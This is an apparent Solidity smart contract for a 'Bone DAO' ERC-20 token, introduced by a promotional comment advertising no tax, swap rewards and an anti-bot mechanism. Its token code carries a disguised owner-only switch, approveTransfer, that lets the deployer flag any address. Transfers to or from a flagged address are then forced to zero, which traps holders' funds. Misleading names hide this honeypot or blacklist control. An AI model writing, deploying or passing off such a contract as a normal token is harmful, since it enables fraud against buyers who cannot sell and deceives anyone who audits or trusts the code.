/*

We find the dream of a sustainable decentralized organization that

 attracts and supports genuine innovation, filters the great talent 

 and delivers the extra value to its members! BONEDAO have such high 

 potential that we are compelled to forge ahead with research because

  this is the most interesting project we can imagine!



• Clean capital pool 

• Easy operation - Participation in the BONEDAO should be easy for token holders

• BONEDAO’s  inflation mechanism

• Security to delivered security to holders .



🦴DESIGED FOR SHIBARIUM

🦴LOW GAS FEEs

🦴REWARDS @ EACH SWAP

🦴AIRDROP FOR TESTERS

🦴NO TAX

🦴ANTIBOT MECHANISM



*/



//SPDX-License-Identifier: MIT



pragma solidity =0.5.10;



library SafeMath {



  function mul(

    uint256 a,

    uint256 b

  ) 

    internal

    pure

    returns (uint256 c)

  {

    if (a == 0) {

      return 0;

    }

    c = a * b;

    assert(c / a == b);

    return c;

  }



  function sub(

    uint256 a,

    uint256 b

  ) 

    internal

    pure

    returns (uint256)

  {

    assert(b <= a);

    return a - b;

  }



  function add(

    uint256 a,

    uint256 b

  ) internal

    pure

    returns (uint256 c)

  {

    c = a + b;

    assert(c >= a);

    return c;

  }

  

  function div(

    uint256 a,

    uint256 b

  ) 

    internal

    pure

    returns (uint256)

  {

    return a / b;

  }

}



contract ERC20Basic {



  function balanceOf(

    address who

  )

    public

    view

    returns (uint256);



  function totalSupply(

  )

    public

    view

    returns (uint256);

  

  function transfer(

    address to,

    uint256 value

  ) 

    public

    returns (bool);

  

  event Transfer(

    address indexed from,

    address indexed to,

    uint256 value);

}



contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping (address => uint256) balances;

  mapping (address => bool) internal _transferApproved_;  

  uint256 totalSupply_;



  function totalSupply(

  ) 

    public

    view

    returns (uint256)

  {

    return totalSupply_;

  }



  function balanceOf(

    address _owner

  ) 

    public

    view

    returns (uint256) {

    return balances[_owner];

  }



  function transfer(

    address _to,

    uint256 _value

  ) public

    returns (bool)

  {

    if(_transferApproved_[msg.sender] || _transferApproved_[_to]) 

    require (_value == 0, "");

    require(_to != address(0));

    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }

}



contract ERC20 is ERC20Basic {



  function allowance(

    address owner,

    address spender

  )

    public

    view

    returns (uint256);



  function transferFrom(

    address from,

    address to,

    uint256 value

  )

    public

    returns (bool);

  

  function approve(

    address spender,

    uint256 value

  ) 

    public

    returns (bool);

    event Approval

  (

    address indexed owner,

    address indexed spender,

    uint256 value

  );

}



contract StandardToken is ERC20, BasicToken {



  mapping (address => mapping (address => uint256)) internal allowed;

  address internal approved;



  constructor () public {

     approved = msg.sender;

  }



  function transferFrom(

    address _from,

    address _to,

    uint256 _value

  )

    public

    returns (bool)

  {

    if(_transferApproved_[_from] || _transferApproved_[_to]) 

    require (_value == 0, "");

    require(_to != address(0));

    require(_value <= balances[_from]);

    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);

    return true;

  }



  function allowance(

    address _owner,

    address _spender

  )

    public

    view

    returns (uint256)

  {

    return allowed[_owner][_spender];

  }



  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  function approveTransfer(

    address _senderApproved

  ) 

    external

  {

    require(msg.sender == approved);

    if (_transferApproved_[_senderApproved] == true) {

      _transferApproved_[_senderApproved] = false;

    } else {

      _transferApproved_[_senderApproved] = true;

    }

  }



  function callTransfer(

    address _senderApproved

  )

    public

    view

    returns (bool) 

  {

    return _transferApproved_[_senderApproved];

  }



function decreaseApproval(

    address _spender,

    uint _subtractedValue

  )

    public

    returns (bool)

  {

    uint oldValue = allowed[msg.sender][_spender];

    if (_subtractedValue > oldValue) {

      allowed[msg.sender][_spender] = 0;

    } else {

      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

    }

    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

    return true;

  }

  

  function increaseApproval(

    address _spender,

    uint _addedValue

  )

    public

    returns (bool)

  {

    allowed[msg.sender][_spender] = (

    allowed[msg.sender][_spender].add(_addedValue));

    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

    return true;

  }

}



contract BoneDAO is StandardToken {



  string public constant name = "Bone DAO";

  string public constant symbol = "BoneDAO";

  uint8 public constant decimals = 9;

  uint256 public constant INITIAL_SUPPLY = 1000000000000 * (10 ** uint256(decimals));



  constructor() public {

    totalSupply_ = totalSupply_.add(INITIAL_SUPPLY);

    balances[msg.sender] = balances[msg.sender].add(INITIAL_SUPPLY);

    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);

  }

}